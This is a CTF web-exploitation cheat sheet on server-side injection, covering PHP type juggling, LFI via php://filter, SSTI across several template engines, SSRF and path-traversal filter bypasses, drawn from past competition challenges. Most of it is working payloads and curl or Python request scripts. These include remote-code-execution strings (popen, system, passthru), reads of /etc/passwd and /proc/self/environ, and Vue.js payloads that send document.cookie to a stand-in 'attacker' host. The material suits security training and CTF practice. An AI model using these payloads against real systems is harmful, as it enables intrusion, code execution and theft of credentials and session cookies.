# CTF Web - Server-Side Injection Attacks

## Table of Contents
- [PHP Type Juggling](#php-type-juggling)
- [PHP File Inclusion / php://filter](#php-file-inclusion--phpfilter)
- [SQL Injection](#sql-injection) — moved to [sql-injection.md](sql-injection.md)
- [Python str.format() Attribute Traversal (PlaidCTF 2017)](#python-strformat-attribute-traversal-plaidctf-2017)
- [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
  - [Jinja2 RCE](#jinja2-rce)
  - [Go Template Injection](#go-template-injection)
  - [EJS Server-Side Template Injection](#ejs-server-side-template-injection)
  - [ERB SSTI + Sequel::DATABASES Bypass (BearCatCTF 2026)](#erb-ssti--sequeldatabases-bypass-bearcatctf-2026)
  - [Mako SSTI](#mako-ssti)
  - [Twig SSTI](#twig-ssti)
  - [Vue.js Template Injection via toString.constructor (VolgaCTF 2018)](#vuejs-template-injection-via-tostringconstructor-volgactf-2018)
  - [SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)](#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026)
- [SSRF](#ssrf)
  - [Host Header SSRF (MireaCTF)](#host-header-ssrf-mireactf)
  - [DNS Rebinding for TOCTOU (Time-of-Check to Time-of-Use)](#dns-rebinding-for-toctou-time-of-check-to-time-of-use)
  - [Curl Redirect Chain Bypass](#curl-redirect-chain-bypass)
  - [Unescaped-Dot Regex Allowlist Bypass (Meepwn CTF Quals 2018)](#unescaped-dot-regex-allowlist-bypass-meepwn-ctf-quals-2018)
  - [SNI-Based FTP Protocol Smuggling via HTTPS (PlaidCTF 2018)](#sni-based-ftp-protocol-smuggling-via-https-plaidctf-2018)
  - [Apache mod_vhost_alias Docroot Override via Host Header (RCTF 2018)](#apache-mod_vhost_alias-docroot-override-via-host-header-rctf-2018)
- [PHP hash_hmac Returns NULL with Array Input (AceBear 2018)](#php-hash_hmac-returns-null-with-array-input-acebear-2018)
- [Smarty SSTI via CVE-2017-1000480 Comment Injection (Insomni'hack 2018)](#smarty-ssti-via-cve-2017-1000480-comment-injection-insomnihack-2018)
- [Recursive-Replace Traversal `....//` (35C3 2018)](#recursive-replace-traversal--35c3-2018)
- [PHP (int) Cast Leading-Number Traversal (35C3 2018)](#php-int-cast-leading-number-traversal-35c3-2018)
- [strpos Substring-Match Blacklist Bypass (TUCTF 2018)](#strpos-substring-match-blacklist-bypass-tuctf-2018)
- [User-Agent-Gated robots.txt (TAMUctf 2019)](#user-agent-gated-robotstxt-tamuctf-2019)
- [PHP log()/INF Math Equality + Recursive urldecode() (Pragyan CTF 2019)](#php-loginf-math-equality--recursive-urldecode-pragyan-ctf-2019)

For XXE, XML injection, PHP variable-variable abuse, uniqid/regex bypasses, command injection, and GraphQL exploitation, see [server-side-2.md](server-side-2.md). For code execution attacks (Ruby/Perl/JS/LaTeX/Prolog injection, PHP preg_replace /e, ReDoS, file upload to RCE, PHP deserialization, XPath injection, Thymeleaf SpEL SSTI), see [server-side-exec.md](server-side-exec.md). For SQLi keyword fragmentation, SQL WHERE bypass, SQL via DNS, bash brace expansion, Common Lisp injection, PHP7 OPcache, and more, see [server-side-exec-2.md](server-side-exec-2.md). For deserialization attacks (Java, Pickle) and race conditions, see [server-side-deser.md](server-side-deser.md). For CVE-specific exploits, path traversal bypasses, Flask/Werkzeug debug, and other advanced techniques, see [server-side-advanced.md](server-side-advanced.md).

---

## PHP Type Juggling

**Pattern:** PHP loose comparison (`==`) performs implicit type conversion, leading to unexpected equality results that bypass authentication and validation checks.

**Comparison table (all `true` with `==`):**
| Comparison | Result | Why |
|-----------|--------|-----|
| `0 == "php"` | `true` | Non-numeric string converts to `0` |
| `0 == ""` | `true` | Empty string converts to `0` |
| `"0" == false` | `true` | `"0"` is falsy |
| `NULL == false` | `true` | Both falsy |
| `NULL == ""` | `true` | Both falsy |
| `NULL == array()` | `true` | Both empty |
| `"0e123" == "0e456"` | `true` | Both parse as `0` in scientific notation |

**Auth bypass with type juggling:**
```php
// Vulnerable: if ($input == $password)
// If $password starts with "0e" followed by digits (MD5 "magic hashes"):
// md5("240610708") = "0e462097431906509019562988736854"
// md5("QNKCDZO")  = "0e830400451993494058024219903391"
// Both compare as 0 == 0 → true
```

**Exploit via JSON type confusion:**
```bash
# Send integer 0 instead of string to bypass strcmp/==
curl -X POST http://target/login \
  -H 'Content-Type: application/json' \
  -d '{"password": 0}'
# PHP: 0 == "any_non_numeric_string" → true
```

**Array bypass for strcmp:**
```bash
# strcmp(array, string) returns NULL, which == 0 == false
curl http://target/login -d 'password[]=anything'
# PHP: strcmp(["anything"], "secret") → NULL → if(!strcmp(...)) passes
```

**Prevention:** Use strict comparison (`===`) which checks both value and type.

**Key insight:** Always test `0`, `""`, `NULL`, `[]`, and `"0e..."` magic hash values against PHP comparison endpoints. JSON `Content-Type` allows sending integer `0` where the application expects a string.

---

## PHP File Inclusion / php://filter

**Pattern:** PHP `include`, `require`, `require_once` accept dynamic paths. Combined with `php://filter`, leak source code without execution.

**Basic LFI:**
```php
// Vulnerable: include($_GET['page'] . ".php");
// Exploit: page=../../../../etc/passwd%00  (null byte, PHP < 5.3.4)
// Modern: page=php://filter/convert.base64-encode/resource=index
```

**Source code disclosure via php://filter:**
```bash
# Base64-encode prevents PHP execution, leaks raw source
curl "http://target/?page=php://filter/convert.base64-encode/resource=config"
# Returns: PD9waHAgJHBhc3N3b3JkID0gInMzY3IzdCI7IC...
echo "PD9waHAg..." | base64 -d
# Output: <?php $password = "s3cr3t"; ...
```

**Filter chains for RCE (PHP >= 7):**
```bash
# Chain convert filters to write arbitrary content
php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|..../resource=php://temp
```

**Common LFI targets:**
```text
/etc/passwd                          # User enumeration
/proc/self/environ                   # Environment variables (secrets)
/proc/self/cmdline                   # Process command line
/var/log/apache2/access.log          # Log poisoning vector
/var/www/html/config.php             # Application secrets
php://filter/convert.base64-encode/resource=index  # Source code
```

**Key insight:** `php://filter/convert.base64-encode/resource=` is the most reliable way to read PHP source code through an LFI — base64 encoding prevents the included file from being executed as PHP.

---

## SQL Injection

SQL injection techniques have been moved to a dedicated file. See [sql-injection.md](sql-injection.md) for all SQL injection techniques.

---

## Python str.format() Attribute Traversal (PlaidCTF 2017)

**Pattern:** Python's `str.format()` method allows attribute/index traversal on format arguments. When user input reaches `.format(obj)`, attackers can access arbitrary attributes of the passed objects.

```python
# Leak object attributes via format string
payload = "{0.__class__.__mro__}"
payload = "{0.secret_field}"

# In Flask: endpoint uses new_name.format(player_object)
# Send: {0.pykemon} to leak all pykemon objects

# Access nested attributes
"{0.__class__.__init__.__globals__}"

# Dictionary key access via bracket notation
"{0[secret_key]}"

# Chaining attribute and index access
"{0.__class__.__mro__[1].__subclasses__()}"
```

**Common vulnerable patterns:**
```python
# Vulnerable: user input as format string
greeting = user_input.format(current_user)

# Vulnerable: format with request object
message = template_str.format(request)

# Safe alternative: use positional or keyword args only
greeting = "Hello, {name}!".format(name=user_input)
```

**Key insight:** Unlike `%s` formatting, Python `str.format()` allows dot-notation attribute traversal (`{0.attr.subattr}`) and bracket indexing (`{0[key]}`), turning any format call with user input into an info leak. This is distinct from SSTI — it does not require a template engine, just a `.format()` call where the format string is user-controlled. Look for Flask/Django views that use `.format()` with user input on model objects or request objects.

---

## SSTI (Server-Side Template Injection)

### Jinja2 RCE
```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Without quotes (use bytes):
{{self.__init__.__globals__.__builtins__.__import__(
    self.__init__.__globals__.__builtins__.bytes([0x6f,0x73]).decode()
).popen('cat /flag').read()}}

# Flask/Werkzeug:
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Go Template Injection
```go
{{.ReadFile "/flag.txt"}}
```

### EJS Server-Side Template Injection
**Pattern (Checking It Twice):** User input passed to `ejs.render()` in error paths.
```javascript
<%- global.process.mainModule.require('./db.js').queryDb('SELECT * FROM table').map(row=>row.col1+row.col2).join(" ") %>
```

### ERB SSTI + Sequel::DATABASES Bypass (BearCatCTF 2026)

**Pattern (Treasure Hunt 5):** Sinatra (Ruby) app uses ERB templates. ERBSandbox restricts direct database access, but `Sequel::DATABASES` global list is unrestricted.

**Detection:** Ruby/Sinatra app, `require 'erb'` in source. Cookie or parameter reflected in rendered response.

```bash
# Confirm SSTI
curl --cookie 'name=<%= 7*7 %>' http://target/upload-highscore
# Response contains "49"

# Enumerate tables
curl --cookie 'name=<%= Sequel::DATABASES.first.tables %>' ...
# → [:players]

# Dump schema
curl --cookie 'name=<%= Sequel::DATABASES.first.schema(:players) %>' ...

# Exfiltrate data
curl --cookie 'name=<%= Sequel::DATABASES.first[:players].all %>' ...
```

**Key insight:** Even when ERB sandboxes block `DB` or `DATABASE` constants, `Sequel::DATABASES` is a global array listing all open Sequel connections. It bypasses variable-name-based restrictions. In Sinatra, `<%= ... %>` tags in cookies or parameters that are reflected through ERB templates are common SSTI vectors.

### Mako SSTI

```python
# Detection
${7*7}  # Returns 49

# RCE
<%
  import os
  os.popen("id").read()
%>

# One-liner
${__import__('os').popen('cat /flag.txt').read()}
```

**Key insight:** Mako templates (Python) execute Python code directly inside `${}` or `<% %>` blocks — no sandbox, no class traversal needed. Detection identical to Jinja2 (`${7*7}`) but payloads are plain Python.

### Twig SSTI

```twig
{# Detection #}
{{7*7}}   {# Returns 49 #}
{{7*'7'}} {# Returns 7777777 (string repeat = Twig, not Jinja2) #}

{# File read #}
{{'/etc/passwd'|file_excerpt(1,30)}}

{# RCE (Twig 1.x) #}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{# RCE (Twig 3.x via filter) #}
{{['id']|map('system')|join}}
{{['cat /flag.txt']|map('passthru')|join}}
```

**Key insight:** Distinguish Twig from Jinja2 via `{{7*'7'}}` — Twig repeats the string (`7777777`), Jinja2 returns `49`. Twig 3.x removed `_self.env` access; use `|map('system')` filter chain instead.

### Vue.js Template Injection via toString.constructor (VolgaCTF 2018)

**Pattern:** Vue.js client-side template injection using constructor chaining to execute JavaScript. When user input is rendered inside a Vue.js template (via `v-html`, server-side interpolation into Vue templates, or reflected into `{{ }}` delimiters), the template expression evaluator executes JavaScript.

**Basic payloads:**
```javascript
// Constructor chaining to create and execute a Function object
${toString.constructor('document.location="http://attacker/?"+document.cookie')()}

// Alternative constructor chain
{{constructor.constructor('return fetch("http://attacker/?c="+document.cookie)')()}}

// Using the _c (createElement) internal to confirm Vue context
{{_c.constructor('return 1')()}}
```

**Payload variations for different Vue versions:**
```javascript
// Vue 2.x — template expressions have access to the component scope
{{constructor.constructor('return this')().document.location='http://attacker/?c='+document.cookie}}

// Vue 2.x — via toString
${toString.constructor('alert(document.domain)')()}

// Vue 3.x — stricter sandbox, but constructor chaining still works
{{(_=toString.constructor('return document'))().cookie}}
```

**Detection and exploitation:**
```python
import requests

target = "http://target/page"

# Step 1: Detect Vue.js template injection
probes = [
    "{{7*7}}",           # Returns 49 if expressions evaluated
    "{{toString()}}",    # Returns [object Object] or similar
    "${7*7}",            # Template literal syntax (some Vue configs)
]
for probe in probes:
    r = requests.get(target, params={"name": probe})
    print(f"Probe: {probe} -> {r.text[:200]}")

# Step 2: Execute via constructor chain
payload = "${toString.constructor('document.location=\"http://attacker/?c=\"+document.cookie')()}"
r = requests.get(target, params={"name": payload})
```

**Key insight:** Vue.js template expressions evaluate JavaScript. When user input is rendered in a Vue template, `toString.constructor(code)()` creates and executes a Function object, bypassing simple keyword filters. This works because JavaScript's `constructor` property on any object provides access to the `Function` constructor. Vue 2.x is more permissive; Vue 3.x has a stricter expression sandbox but constructor chaining often still works. Look for reflected input in pages that include Vue.js and use `{{ }}` or `v-bind` directives.

### SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)

**Pattern (KameHame-Hack):** Jinja2 SSTI where quotes are filtered, preventing string arguments. Use Python keyword arguments to bypass — `__dict__.update(key=value)` requires no quotes.

```python
# Quotes filtered → can't do {{ config['SECRET_KEY'] }} or string args
# But keyword arguments don't need quotes:
{{player.__dict__.update(power_level=9999999) or player.name}}
```

**How it works:**
1. `player.__dict__.update(power_level=9999999)` — modifies object attribute directly via keyword arg (no quotes needed)
2. `or player.name` — `dict.update()` returns `None` (falsy), so Jinja2 renders `player.name` as output
3. The attribute change persists across requests in the session

**Key insight:** When SSTI filters block quotes/strings, Python's keyword argument syntax (`func(key=value)`) operates without any string delimiters. `__dict__.update()` can modify any object attribute to bypass application logic (e.g., game state, auth checks, permission levels).

### Smarty SSTI via CVE-2017-1000480 Comment Injection (Insomni'hack 2018)

**Pattern:** Smarty 3 < 3.1.32 with custom template resources places the template source file path inside a PHP comment (`/* ... */`) in compiled templates. If the path is user-controlled and `*/` is not sanitized, injecting `*/phpcode();/*` breaks out of the comment and executes arbitrary PHP.

```text
# Vulnerable URL pattern — template ID/path is user-controlled:
http://target/?id=*/echo file_get_contents('/flag');/*

# What happens server-side in the compiled template:
# <?php /* source: /path/to/*/echo file_get_contents('/flag');/* */ ?>
# The injected */ closes the comment, PHP code executes, /* reopens a comment
```

```php
// Smarty compiled template (simplified):
// Before injection:
<?php /* Smarty version x, compiled from "user_template_name" */ ?>

// After injection with id = */echo file_get_contents('/flag');/*
<?php /* Smarty version x, compiled from "*/echo file_get_contents('/flag');/*" */ ?>
// Breaks down to:
//   /* Smarty version x, compiled from "*/   ← comment ends here
//   echo file_get_contents('/flag');          ← PHP executes
//   /*" */                                    ← new comment
```

```python
import requests

# Basic file read
r = requests.get("http://target/", params={
    "id": "*/echo file_get_contents('/flag');/*"
})
print(r.text)

# RCE
r = requests.get("http://target/", params={
    "id": "*/system('id');/*"
})
print(r.text)

# If parentheses are filtered, use backtick execution:
r = requests.get("http://target/", params={
    "id": "*/echo `cat /flag`;/*"
})
```

**Key insight:** Smarty places the template source path in a `/* ... */` PHP comment. If the path is user-controlled and `*/` is not sanitized, arbitrary PHP executes. This affects custom Smarty resources (where the template name comes from user input), not the default file-based resource handler. Fixed in Smarty 3.1.32. Look for Smarty template rendering where the template identifier is derived from URL parameters.

---

## PHP hash_hmac Returns NULL with Array Input (AceBear 2018)

**Pattern:** PHP's `hash_hmac()` returns `NULL` (with a warning, not a fatal error) when the `$data` argument is an array instead of a string. Sending `nonce[]=x` via POST forces the parameter to be an array, making the HMAC output predictable since `hash_hmac('sha256', NULL, $secret)` is equivalent to `hash_hmac('sha256', '', $secret)` -- but more critically, when the `$key` argument receives `NULL` from a prior broken `hash_hmac`, all subsequent HMAC computations use an empty key.

```php
// Vulnerable server code:
$nonce = $_POST['nonce'];
$secret = file_get_contents('/secret_key');
$mac = hash_hmac('sha256', $nonce, $secret);  // returns NULL if $nonce is array

// Later: server uses $mac (NULL) as key for another HMAC
$token = hash_hmac('sha256', 'gimmeflag', $mac);
// hash_hmac('sha256', 'gimmeflag', NULL) == hash_hmac('sha256', 'gimmeflag', '')
// This is a known constant the attacker can precompute!
```

```python
import hmac
import hashlib
import requests

# Precompute the token that the server will generate when mac=NULL
# hash_hmac('sha256', 'gimmeflag', NULL) in PHP == HMAC with empty key in Python
known_token = hmac.new(b'', b'gimmeflag', hashlib.sha256).hexdigest()
print(f"Predicted token: {known_token}")

# Force nonce to be an array, breaking hash_hmac
r = requests.post("http://target/getflag", data={
    "nonce[]": "x",          # PHP receives $_POST['nonce'] as array ['x']
    "token": known_token      # server-side comparison succeeds
})
print(r.text)
```

```text
# HTTP request showing the array injection:
POST /getflag HTTP/1.1
Content-Type: application/x-www-form-urlencoded

nonce[]=x&token=<precomputed_hmac>
```

**Key insight:** PHP silently coerces types, and `hash_hmac` with a non-string `$data` argument returns `NULL`/`false` instead of raising an error. Always check if parameters can be forced to arrays via `param[]=value`. This pattern extends to other PHP hash functions: `md5(array())` returns `NULL`, `sha1(array())` returns `NULL`. Any authentication flow chaining hash outputs as keys for subsequent operations is vulnerable when an intermediate hash can be forced to `NULL`.

---

## SSRF

### Host Header SSRF (MireaCTF)

Server-side code uses the HTTP `Host` header to construct internal validation requests:
```go
// Vulnerable: uses client-controlled Host header for internal request
response, err := http.Get("http://" + c.Request.Host + "/validate")
```

**Exploitation:**
1. Set up an attacker-controlled server returning the desired response:
   ```python
   from flask import Flask
   app = Flask(__name__)

   @app.route("/validate")
   def validate():
       return '{"access": true}'

   app.run(host='0.0.0.0', port=5000)
   ```
2. Expose via ngrok or public VPS, then send the request with a spoofed Host header:
   ```bash
   curl -H "Host: attacker.ngrok-free.app" https://target/api/secret-object
   ```

**Key insight:** The server makes an internal HTTP request to `http://<Host-header>/validate` instead of `http://localhost/validate`. By setting the Host header to an attacker-controlled domain, the validation request goes to the attacker's server, which returns `{"access": true}`. This bypasses IP-based access controls entirely.

**Detection:** Server code that builds URLs from `request.Host`, `request.headers['Host']`, `c.Request.Host` (Go/Gin), or `$_SERVER['HTTP_HOST']` (PHP) for internal service calls.

---

### DNS Rebinding for TOCTOU (Time-of-Check to Time-of-Use)
```python
rebind_url = "http://7f000001.external_ip.rbndr.us:5001/flag"
requests.post(f"{TARGET}/register", json={"url": rebind_url})
requests.post(f"{TARGET}/trigger", json={"webhook_id": webhook_id})
```

### Curl Redirect Chain Bypass
After `CURLOPT_MAXREDIRS` exceeded, some implementations make one more unvalidated request:
```c
case CURLE_TOO_MANY_REDIRECTS:
    curl_easy_getinfo(curl, CURLINFO_REDIRECT_URL, &redirect_url);
    curl_easy_setopt(curl, CURLOPT_URL, redirect_url);  // NO VALIDATION
    curl_easy_perform(curl);
```

### Unescaped-Dot Regex Allowlist Bypass (Meepwn CTF Quals 2018)

**Pattern:** SSRF target allowlist is enforced with a regex like `/^https?:\/\/meepwntube\.0x1337\.space$/`. The author forgot to escape the dots, so `.` matches any character. Register a domain whose literal name contains the right characters (`meepwntubex0x1337.space`) and point its A record at `127.0.0.1`.

**Exploit:**
```bash
# Register meepwntubex0x1337.space, set A record → 127.0.0.1
curl "https://target/fetch?url=http://meepwntubex0x1337.space/internal"
# Regex: /meepwntube.0x1337.space$/ matches (each '.' matched as '.' OR 'x')
# DNS resolves to 127.0.0.1 → SSRF to internal services
```

**Key insight:** Always escape `.` in URL allowlist regexes (`\.`) and anchor both ends (`^...$`). Unescaped dots turn a whitelist into a wildcard-prefix/suffix match — any attacker-controlled domain that fits the skeleton passes. Combine with a DNS record pointing to the loopback/internal range for direct SSRF.

**References:** Meepwn CTF Quals 2018 — writeup 10441

### SNI-Based FTP Protocol Smuggling via HTTPS (PlaidCTF 2018)

**Pattern (idIoT: Camera):** A custom FTP server exposes an `IP` command used by the passive mode handshake. The only attacker primitive is a browser fetch (XSS). Browsers refuse to send custom FTP commands, but they do open HTTPS connections — and the TLS ClientHello contains the Server Name Indication (SNI) as plaintext. The FTP server ignores unknown commands and treats both `\n` and `\x00` as command terminators, so a carefully chosen hostname leaks FTP commands into its parser.

**Exploit:**
```text
# Victim SNI hostname encodes the FTP command. The SNI length field
# (2 bytes: 0x00 0x69) becomes 'i\n' when the first byte lines up with ASCII 'i'.
# Subsequent payload bytes carry 'IP 240.1.2.3\n' terminators.

https://ip8.8.8.8.aaaaaa...aaa.127.0.0.1.xip.io:1212/
```
1. Host `ip8.8.8.8....xip.io` resolves to the FTP server port.
2. The browser sends a TLS ClientHello whose SNI bytes embed `IP 240.1.2.3\n`.
3. The FTP server's line parser sees the SNI bytes as a new `IP` command, reassigning the passive-mode destination to the attacker.
4. Subsequent `PASV` responses point the victim client at the attacker's IP, leaking the uploaded image.

**Key insight:** Any plaintext framing inside an otherwise-encrypted protocol (SNI, HTTP Host header, ALPN) is a smuggling surface for servers that parse raw bytes. When victim browsers refuse to speak the target protocol directly, pick a protocol whose handshake echoes attacker-controlled bytes and tune the hostname so those bytes happen to form valid commands in the target parser.

**References:** PlaidCTF 2018 — writeup 10018

### Apache mod_vhost_alias Docroot Override via Host Header (RCTF 2018)

**Pattern:** The server uses Apache's `mod_vhost_alias` with a wildcard document root such as `VirtualDocumentRoot /var/www/%0/`, so the directory served is derived at request time from the `Host` header. A PHP sandbox confines execution to `/var/www/sandbox/<token>/`, but because the docroot itself is taken from the header, setting `Host: ../../var/www/` (or any neighboring vhost) points the runtime outside the sandbox before PHP ever looks at the `open_basedir`.

**Exploit:**
```http
GET /shell.php HTTP/1.1
Host: ../admin
```
Apache resolves the docroot to `/var/www/admin`, so the request lands in a directory that was never intended to serve attacker code, bypassing the sandbox entirely.

**Key insight:** When a multi-tenant Apache config computes the docroot from user-controlled inputs (`Host`, `X-Forwarded-Host`, cookies), every directory-based isolation mechanism downstream (PHP `open_basedir`, chroot helpers) depends on the inputs being sanitized *before* docroot resolution. Either pin the docroot via `ServerName`/`ServerAlias` or reject Host values containing `..`, `/`, or NULs at the Apache layer.

**References:** RCTF 2018 — writeup 10150

## Recursive-Replace Traversal `....//` (35C3 2018)

**Pattern:** Filter strips `../` with a single `str_replace('../', '', $path)` pass. The payload `....//` contains `../` exactly once in the middle — after removal, the surrounding characters collapse into `../`.

```text
Accept-Language: ....//....//....//....//flag
            →    ../ ../ ../ ../flag
```

**Key insight:** Non-recursive filters that remove substrings once leave their residue interleaved in a way that re-forms the target. `....//` is for `../`; `....\\\\` is for `..\`. Use until the filter iterates to a fixed point.

**References:** 35C3 CTF 2018 — flags, writeup 12831

---

## PHP (int) Cast Leading-Number Traversal (35C3 2018)

**Pattern:** Validation casts the parameter to `(int)` and compares against a blacklist, but the raw string is later concatenated into a filesystem path. `(int) "-4133353959107185265/../../admin"` returns `-4133353959107185265`, so the numeric check passes while the raw value carries a path traversal.

```text
id=-4133353959107185265/../../admin
```

**Key insight:** Any validator that *casts* instead of *parses* only sees the leading numeric prefix. Always compare the original input against a strict regex (`^-?\d+$`) when the same string is reused downstream.

**References:** 35C3 CTF 2018 — Not(e) accessible, writeup 12879

---

## strpos Substring-Match Blacklist Bypass (TUCTF 2018)

**Pattern:** PHP blocks LFI targets with `if (strpos($file, '/etc/passwd') == true) die();`. `strpos` returns the *position* of the substring (or `false`), so the filter only blocks paths that contain the literal string. Any traversal that ends in a different file passes the check.

```php
# Bypass: file=../../TheEgg.html — strpos returns false, include proceeds
```

Also: `strpos(...) == true` (loose comparison) is true for any non-zero offset; the subtle version of this bug blocks substring matches at offset `>=1` but allows substring matches at offset `0`.

**Key insight:** `strpos()`, `str_contains()`, and `preg_match()` are identification checks, not validation. For filename/path safety, resolve the full path with `realpath()` and compare against an allowlisted root.

**References:** TUCTF 2018 — Easter Egg: Crystal Gate, writeup 12380

---

## User-Agent-Gated robots.txt (TAMUctf 2019)

**Pattern:** `/robots.txt` serves different bodies depending on the `User-Agent`. Humans (default UAs) see a decoy file; crawler UAs such as `Googlebot/2.1` see the real `Disallow:` list — which is where the challenge hides paths.

```bash
# Decoy
curl -s http://target/robots.txt
# "WHAT IS UP, MY FELLOW HUMAN! ..."

# Real file
curl -s -A 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' \
     http://target/robots.txt
# User-agent: Googlebot
# Disallow: /super-secret-admin-panel/
# Disallow: /flag-is-here.txt
```

Always rotate through common crawler UAs when recon reveals a themed robots.txt decoy:

```bash
for UA in \
  'Googlebot/2.1' \
  'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)' \
  'Mozilla/5.0 (compatible; YandexBot/3.0)' \
  'facebookexternalhit/1.1' \
  'Slackbot-LinkExpanding 1.0' \
  'Twitterbot/1.0'; do
  echo "=== $UA ==="
  curl -s -A "$UA" http://target/robots.txt
done
```

**Key insight:** Bot-specific content negotiation on `robots.txt` (and `sitemap.xml`, `/.well-known/*`, home pages) can disclose paths normally hidden from human browsers. Always test with `User-Agent: Googlebot/2.1` and the other major crawler signatures — the same bypass also works on paywalls that allow bots to index content and on WAFs that allowlist crawlers by UA alone.

**References:** TAMUctf 2019 — Robots Rule, writeup 13707

---

## PHP log()/INF Math Equality + Recursive urldecode() (Pragyan CTF 2019)

**Pattern 1 — INF == INF:** PHP's `log()`/`log10()` of a huge float returns `INF`, and `INF == INF` is true. A gate like
```php
$a = hash('sha256', $a);              // 64 hex chars, e.g. "a..." -> string
$a = (log10($a ** 0.5)) ** 2;         // "a..." ** 0.5 -> INF, log10(INF) -> INF, **2 -> INF
if ($c > 0 && $d > 0 && $d > $c && $a == $c*$c + $d*$d) { /* pass */ }
```
passes whenever `$c*$c + $d*$d` is also INF. `7e1000` (over `DBL_MAX`) is `INF` in PHP, so `val3=1&val4=7E1000` satisfies the `$d > $c` ordering with both sides INF.

**Pattern 2 — Recursive urldecode loop:** A loop requires `$b != urldecode($b)` ten times and the final value to equal `"WoAHh!"`. `%25` decodes to `%`, so each pass peels one layer: encode the first character nine times.
```
WoAHh! -> %57oAHh! -> %2557oAHh! -> ... (10 layers) -> %2525252525252525252557oAHh!
```

```bash
curl 'http://target/?val1=a&val2=1&val3=1&val4=7E1000&val5=a&val6=%2525252525252525252557oAHh!'
```

**Key insight:** PHP float comparison accepts `INF == INF`; any math-style equality check becomes trivial if you can push both sides past `DBL_MAX`. Hashes stringified into floats collapse to 0 or INF, so `sha256(x) ** 0.5` and `log*()` are classic "juggling" primitives. For recursive decoder loops, the fixed point of repeated urldecode is "no `%` left"; encode one character N times with `%25` padding to force exactly N passes.

**References:** Pragyan CTF 2019 — Mandatory PHP, writeup 13837

---

See [server-side-2.md](server-side-2.md) for XXE, XML injection, command injection, GraphQL, and the remaining PHP-specific tricks (variable variables, uniqid, sequential regex bypass).
